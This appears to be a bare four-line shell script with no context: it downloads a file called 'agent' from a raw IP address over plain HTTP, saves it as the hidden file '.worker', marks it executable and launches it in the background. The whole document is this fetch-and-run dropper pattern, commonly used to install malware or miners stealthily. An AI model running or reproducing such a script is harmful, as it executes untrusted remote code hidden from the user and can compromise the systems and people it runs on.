#!/bin/sh
curl http://8.3.4.5/agent -o .worker
chmod +x .worker
./.worker &
